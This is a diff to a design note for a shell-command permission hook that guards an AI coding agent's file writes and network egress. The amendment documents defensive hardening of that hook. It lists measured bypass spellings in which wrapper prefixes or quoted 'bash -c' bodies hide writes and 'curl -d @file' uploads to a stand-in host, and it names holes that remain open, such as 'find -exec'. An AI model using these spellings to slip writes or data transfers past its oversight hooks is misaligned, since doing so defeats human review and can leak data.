@@ -314,8 +314,14 @@ OUT, each for a stated reason:
   so stepping would resolve a WRONG verb rather than recover a hidden one. A loop BODY is
   still covered, because `do` is in the set.
 - `fi`, `done`, `esac`, `}`, `)`: closers; nothing follows them inside their segment.
-- `coproc`, `function`: both take an optional NAME before the command, the same reason
-  `timeout`, `stdbuf`, `nice`, `setsid`, `xargs` and `watch` are absent from `WRAPPERS`.
+- `coproc`, `function`: both take an OPTIONAL NAME before the command, and an optional
+  name is not distinguishable from the command itself, so stepping over it resolves a
+  WRONG verb as often as it recovers a hidden one. This reason stands on its own. It was
+  originally given by analogy ("the same reason `timeout`, `stdbuf`, `nice`, `setsid`,
+  `xargs` and `watch` are absent from `WRAPPERS`"), and that analogy is dead: the cycle P
+  amendment below made all six `WRAPPERS` entries. The distinction that survives is
+  SHAPE. `timeout`'s one positional is a DURATION, which has a checkable shape, so it can
+  be stepped conditionally; an optional name has no shape at all.
 
 ### Three glued prefixes, and why the two substitution syntaxes are one case
 
@@ -439,3 +445,156 @@ NOT MEASURED, stated plainly: a write LANDING ON DISK through the full Claude Co
 "Bash writes the file in every one of these spellings" is shell semantics, not an
 observation of a file appearing on this machine. No test in this cycle creates, opens or
 reads a credential file; the classifier is path-only (organization credential ban).
+
+## Amendment (cycle P): six wrapper prefixes, and one reason that was false
+
+Same seam, fourth instance, and the same single function. `verb_at` stepped over a command
+prefix only by membership in `WRAPPERS`, so `xargs`, `timeout`, `nice`, `stdbuf`, `watch`
+and `setsid` became `cmd0` themselves and the real command was never resolved. Because
+`verb_at` is the single source for the write pass, the egress pass and the interpreter
+pass, each prefix hid a write AND a data transfer.
+
+### Measured before the fix
+
+Through the write gate's own embedded extractor with `WRIT_CWD=/proj`:
+
+```
+ls | xargs cp -t src                  -> set()
+ls | xargs -I{} cp {} src/y.py        -> set()
+timeout 5 cp seed.txt src/y.py        -> set()
+nice -n 5 cp seed.txt src/y.py        -> set()
+stdbuf -oL cp seed.txt src/y.py       -> set()
+watch -n1 cp seed.txt src/y.py        -> set()
+setsid cp seed.txt src/y.py           -> set()
+
+ls | xargs curl -d @src/a.txt https://example.invalid  -> set()
+timeout 5 curl -d @src/a.txt https://example.invalid   -> set()
+setsid curl -d @src/a.txt https://example.invalid      -> set()
+
+sudo cp seed.txt src/y.py             -> local /proj/src/y.py   (control)
+env FOO=1 cp seed.txt src/y.py        -> local /proj/src/y.py   (control)
+```
+
+The obstacle the header had recorded ("each takes non-flag positional arguments of its own
+before the command and a naive skip would mis-read the verb") was true of exactly ONE of
+the six.
+
+### Decision: STRICT tables, not PERMISSIVE skipping
+
+All six entries carry BOTH a value-flag set and a no-value-flag set. `WRAPPERS` already
+supported that arm for `sudo` and `doas`, and `verb_at` already parsed bundled shorts, a
+value glued to its letter, the `--flag=value` long form, the spaced form, and `--` as end
+of options.
+
+Alternative rejected: PERMISSIVE (`None` second element, as `command` / `env` / `exec` /
+`nohup` / `time` use). It skips any dash token, which handles a glued value by accident,
+but it reads a SPACED value of an UNKNOWN flag as the verb. STRICT bails to
+`("", len(seg), [])` instead. The trade is identical in all six entries: a mis-classified
+or unknown flag costs a MISS, never a prompt naming the wrong command. Fail-closed for the
+verb, fail-open for detection. A bailed segment's plain redirects are still extracted,
+because the redirect loop never consults the verb.
+
+Per-entry decisions and what each trades:
+
+- `setsid`: no value-taking flag at all, so nothing can be mis-placed.
+- `stdbuf`: all three real flags take a value, and the measured `-oL` resolves through the
+  existing glued-short branch, so no new parsing shape appears.
+- `nice`: `-n` takes a value; bare `nice cp` needs no positional step, because the flag
+  loop breaks on the first non-dash token. ACCEPTED MISS: the obsolete `nice -5 cmd`
+  spelling is an unknown option letter and bails. Handling it would mean treating a
+  numeric option letter as an adjustment, a second parsing shape for one deprecated
+  spelling.
+- `watch`: `-n/--interval` and `-q/--equexit` take values.
+  `--differences[=permanent]` is listed NOVALUE on purpose, because an optional long value
+  must be glued with `=` and the long branch checks the no-value set first.
+- `xargs`: several value-taking flags including the measured glued `-I{}`, `-n1` and `-P4`.
+  ACCEPTED MISS: GNU's optional-argument shorts (`-e`, `-i`, `-l`) are listed NOVALUE, so
+  the common `xargs -i cp {} src/y.py` resolves `cp` while the glued `xargs -iX cp ...`
+  hits an unknown letter and bails.
+- `timeout`: `-s` and `-k` take values, plus the one genuine positional below.
+
+### The positional, and why it is a side table
+
+`timeout DURATION COMMAND` is the only positional among the thirteen wrappers. Rather than
+widen the `WRAPPERS` tuple to a third element and touch twelve untouched entries, it is a
+one-line side table plus a shape check:
+
+```python
+WRAPPER_POSITIONALS = {"timeout": 1}
+DURATION = re.compile(r"^[0-9]+(?:\.[0-9]+)?[smhd]?$")
+```
+
+stepped immediately after the wrapper's flag loop. Placement there is what makes every
+spelling work: the loop exits by `break` on the first non-dash token (`timeout 5 cp`), or
+on `--` (`timeout -- 5 cp`), or after consuming a value (`timeout -s KILL 5 cp`,
+`timeout -k 1 5 cp`), and the step runs in all four cases. A bail inside the flag loop
+returns from `verb_at` outright, so the step is never reached with an unclassified option,
+and `.get(name, 0)` is 0 for the other twelve wrappers, so no existing prefix changes
+behavior by one token.
+
+The step is SHAPE-CHECKED, not blind, and that is load-bearing. A token that does not look
+like a duration is NOT skipped and becomes the verb, so `timeout cp seed.txt src/y.py`
+still resolves `cp`. The only command that lands in the unchecked branch is one `timeout`
+itself rejects, so the cost of the check is at worst an extra row for a command that never
+runs, never a lost row for one that does.
+
+### The false reason, which is the amendment's second half
+
+The write gate's inline-interpreter note said `sh -c` and `bash -c` are not covered
+because "their body is shell, already parsed by the vectors above". MEASURED, that is
+false in every quoted spelling: `bash -c "echo x > src/y.py"`,
+`bash -c "cp seed.txt src/y.py"`, `bash -c "echo x | tee src/y.py"`,
+`sh -c "echo x > src/y.py"` and `bash -c 'echo x > src/y.py'` all emit the empty set,
+because the body is ONE token and a token beginning with a quote character never matches
+`REDIR`. Only the unquoted `bash -c echo x > src/y.py` is seen, and it is seen because at
+that point the redirect belongs to the OUTER command.
+
+The BEHAVIOR of `sh -c`, `bash -c` and `eval` is deliberately unchanged. The reason on the
+record is now the real one: the false-positive cost of gating every `bash -c`. A
+disclosure that misstates WHY a hole is open is worse than one that admits it, because it
+stops the next reader re-examining it. That is what happened here: the wrong reason
+survived long enough to be quoted in three other documents as a bare list item.
+
+### Deferred, each for a stated reason
+
+- `find -exec` / `-execdir`. A DIFFERENT MECHANISM: the nested command sits inside an
+  argument list with a terminator (`\;`, `';'` or `+`), not in front of the command, so no
+  prefix step can reach it. All four spellings were measured silent, and the four silences
+  are pinned as tests so the deferral is visible rather than assumed.
+- DELETION. `rm` and `rm -rf` remain out of scope for this gate by recorded ruling, so
+  `find . | xargs rm` STAYS silent after the fix. Pinned, so the prefix closure is not
+  read as smuggling deletion into scope.
+- The worktree gate's own `WRAPPERS`. Prose corrected, code untouched: its parsing is
+  permissive-only by design, it has no positional mechanism, and `timeout 5 git worktree
+  remove x` evading it is INFERRED from the code rather than measured. Growing it would be
+  a second unmeasured change in a module this cycle had no evidence about.
+- Further transparent prefixes with no table yet (`ionice`, `chrt`, `flock`, `unbuffer`,
+  `script`, `parallel`, `su -c`, `strace`). Each is a table away, not a mechanism away.
+
+### The residue is machine-readable now
+
+The write gate's header used to name the still-uncovered prefixes in prose, and the test
+that ratcheted it matched substrings. After the fix those substrings all still appear in
+the file as `WRAPPERS` keys, so the pin would have passed VACUOUSLY rather than gone red.
+The header now carries a names-only block between `# UNCOVERED PREFIXES BEGIN` and
+`# UNCOVERED PREFIXES END`, with every reason in the prose ABOVE it, and the test derives
+both sides: the block must be non-empty, must name `find -exec` and `find -execdir`, and
+must be DISJOINT from the hook's own `WRAPPERS` keys. Naming a covered prefix as
+uncovered, and closing a prefix without updating the block, now both redden.
+
+### Measured versus inferred
+
+MEASURED: the ten extractor rows above and the two controls; each of the six flag tables
+against the installed binary's own `--help` (coreutils 9.4, util-linux 2.39.3, findutils
+4.9.0, procps-ng 4.0.4); `xargs --max-lines` taking an OPTIONAL argument, executed rather
+than read off `--help`, which prints it as though required; the six quoted `sh -c` /
+`bash -c` spellings; all four `find -exec` spellings; and the real write-gate hook's
+`permissionDecision` for one prefixed egress command (`timeout 5 curl ...` asks and names
+the host).
+
+NOT MEASURED, stated plainly: the real hook's `permissionDecision` for the seven prefixed
+write rows and the other two prefixed egress rows, which are proved at the extractor layer
+only; and a write LANDING ON DISK through the full Claude Code path, which a PreToolUse
+hook test cannot show at all and which is therefore left unclaimed. INFERRED, not
+measured: `timeout 5 git worktree remove x` evading the worktree gate by the same
+mechanism.
